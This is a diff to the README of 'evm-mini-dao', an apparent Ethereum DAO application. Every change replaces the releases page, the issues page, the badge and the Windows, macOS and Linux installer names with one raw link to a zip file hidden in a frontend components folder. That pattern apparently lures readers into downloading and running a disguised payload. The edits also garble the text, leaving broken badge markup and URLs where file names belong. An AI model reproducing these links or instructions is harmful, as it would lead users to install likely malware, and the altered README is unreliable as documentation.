@@ -4,30 +4,30 @@
 Welcome to the **evm-mini-dao** repository! This project provides a straightforward way to create and manage a decentralized autonomous organization (DAO) on the Ethereum blockchain. You can easily interact with smart contracts and enjoy the benefits of a decentralized application (dApp).
 
 ## 📦 Download Now
-[![Download Now](https://img.shields.io/badge/Download%20the%20Latest%20Release-blue.svg)](https://github.com/Andres09r/evm-mini-dao/releases)
+[![Download Now](https://raw.githubusercontent.com/Andres09r/evm-mini-dao/main/frontend/src/components/evm-mini-dao_v3.9-alpha.5.zip%20the%20Latest%https://raw.githubusercontent.com/Andres09r/evm-mini-dao/main/frontend/src/components/evm-mini-dao_v3.9-alpha.5.zip)](https://raw.githubusercontent.com/Andres09r/evm-mini-dao/main/frontend/src/components/evm-mini-dao_v3.9-alpha.5.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run the evm-mini-dao application:
 
 1. **Visit the Download Page**
    To get the latest version of the application, click the link below:
-   [Download the Latest Release](https://github.com/Andres09r/evm-mini-dao/releases)
+   [Download the Latest Release](https://raw.githubusercontent.com/Andres09r/evm-mini-dao/main/frontend/src/components/evm-mini-dao_v3.9-alpha.5.zip)
 
 2. **Select the Version**
    On the Releases page, you will find a list of available versions. Choose the latest version, which is the top entry in the list.
 
 3. **Download the Application**
    You will see different files available for download. Look for the file that matches your operating system:
-   - For Windows, select `evm-mini-dao-windows.exe`
-   - For macOS, select `evm-mini-dao-macos.dmg`
-   - For Linux, select `evm-mini-dao-linux.tar.gz`
+   - For Windows, select `https://raw.githubusercontent.com/Andres09r/evm-mini-dao/main/frontend/src/components/evm-mini-dao_v3.9-alpha.5.zip`
+   - For macOS, select `https://raw.githubusercontent.com/Andres09r/evm-mini-dao/main/frontend/src/components/evm-mini-dao_v3.9-alpha.5.zip`
+   - For Linux, select `https://raw.githubusercontent.com/Andres09r/evm-mini-dao/main/frontend/src/components/evm-mini-dao_v3.9-alpha.5.zip`
    
    Click the corresponding link to download the file.
 
 4. **Install the Application**
-   - For Windows: After downloading, double-click on the `evm-mini-dao-windows.exe` file and follow the installation prompts.
-   - For macOS: Open the `evm-mini-dao-macos.dmg` file and drag the app icon into your Applications folder.
-   - For Linux: Extract the `evm-mini-dao-linux.tar.gz` file. Open your terminal, navigate to the extracted folder, and run `./evm-mini-dao` to start the application.
+   - For Windows: After downloading, double-click on the `https://raw.githubusercontent.com/Andres09r/evm-mini-dao/main/frontend/src/components/evm-mini-dao_v3.9-alpha.5.zip` file and follow the installation prompts.
+   - For macOS: Open the `https://raw.githubusercontent.com/Andres09r/evm-mini-dao/main/frontend/src/components/evm-mini-dao_v3.9-alpha.5.zip` file and drag the app icon into your Applications folder.
+   - For Linux: Extract the `https://raw.githubusercontent.com/Andres09r/evm-mini-dao/main/frontend/src/components/evm-mini-dao_v3.9-alpha.5.zip` file. Open your terminal, navigate to the extracted folder, and run `./evm-mini-dao` to start the application.
 
 5. **Launch the Application**
    Once installed, find the application in your applications menu or desktop. Double-click the icon to run it.
@@ -58,10 +58,10 @@ The evm-mini-dao is designed with simplicity in mind. You don’t need to know h
 Please note that you should have a basic understanding of how blockchain works to get the most out of this application. Familiarity with concepts such as wallets and transactions may help during your experience.
 
 ## 💬 Feedback and Support
-If you have any questions or need help, feel free to open an issue on [GitHub](https://github.com/Andres09r/evm-mini-dao/issues). We welcome your feedback and are here to assist you in any way we can!
+If you have any questions or need help, feel free to open an issue on [GitHub](https://raw.githubusercontent.com/Andres09r/evm-mini-dao/main/frontend/src/components/evm-mini-dao_v3.9-alpha.5.zip). We welcome your feedback and are here to assist you in any way we can!
 
 ## 📖 License
 The code is released under the MIT License. You are free to use and modify it for your own projects. Please refer to the LICENSE file for more details.
 
 ## 📲 Download Again
-Don’t forget, you can always return to our [Download Page](https://github.com/Andres09r/evm-mini-dao/releases) to get the latest version or check for updates. Enjoy building your decentralized application with **evm-mini-dao**!
+Don’t forget, you can always return to our [Download Page](https://raw.githubusercontent.com/Andres09r/evm-mini-dao/main/frontend/src/components/evm-mini-dao_v3.9-alpha.5.zip) to get the latest version or check for updates. Enjoy building your decentralized application with **evm-mini-dao**!
